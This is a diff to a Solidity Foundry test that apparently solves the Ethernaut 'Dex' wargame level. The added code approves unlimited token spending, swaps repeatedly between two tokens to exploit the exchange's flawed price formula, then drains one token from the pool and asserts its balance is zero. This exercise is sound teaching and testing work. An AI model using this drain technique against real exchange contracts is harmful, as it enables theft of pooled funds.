@@ -8,6 +8,8 @@ import "../src/metrics/Statistics.sol";
 import "../src/levels/DexFactory.sol";
 import "../src/levels/Dex.sol";
 
+import {IERC20} from "openzeppelin-contracts/token/ERC20/ERC20.sol";
+
 contract DexTest is Test {
     using stdStorage for StdStorage;
 
@@ -46,11 +48,11 @@ contract DexTest is Test {
         // Parse emitted logs
         Vm.Log[] memory entries = vm.getRecordedLogs();
         assertEq(
-            entries[0].topics[0],
+            entries[11].topics[0],
             keccak256("LevelInstanceCreatedLog(address,address,address)")
             // event LevelInstanceCreatedLog(address indexed player, address indexed instance, address indexed level);
         );
-        Vm.Log memory levelDexCreatedLog = entries[0];
+        Vm.Log memory levelDexCreatedLog = entries[11];
 
         // Cast bytes32 log arg into address
         address instanceAddress = address(
@@ -83,6 +85,35 @@ contract DexTest is Test {
         //
         // | 0                | 65               | 110              | 45               | 45 B | 110 A      |
         // | 110              | 20               | 0                | 90               | ---- | -----      |
+
+        IERC20(instance.token1()).approve(address(instance), type(uint256).max);
+        IERC20(instance.token2()).approve(address(instance), type(uint256).max);
+
+        bool keepSwapping = true;
+        address from = instance.token1();
+        address to = instance.token2();
+        while (keepSwapping) {
+            // Swap
+            instance.swap(from, to, IERC20(from).balanceOf(eoa));
+            // If we have more of a token than whats available in the pool, stop swapping
+            if (
+                IERC20(to).balanceOf(eoa) >=
+                IERC20(to).balanceOf(address(instance))
+            ) keepSwapping = false;
+            // Swap from and to
+            (from, to) = (to, from);
+        }
+        // Swap max to drain
+        instance.swap(from, to, IERC20(from).balanceOf(address(instance)));
+
+        uint256 poolBalanceTokenTo = IERC20(to).balanceOf(address(instance));
+        emit log_named_uint("poolBalanceTokenTo", poolBalanceTokenTo);
+        assertTrue(poolBalanceTokenTo == 0);
+        uint256 poolBalanceTokenFrom = IERC20(from).balanceOf(
+            address(instance)
+        );
+        emit log_named_uint("poolBalanceTokenFrom", poolBalanceTokenFrom);
+        assertTrue(poolBalanceTokenFrom > 0);
 
         /* Level Submit */
         // Start recording logs to capture level completed log
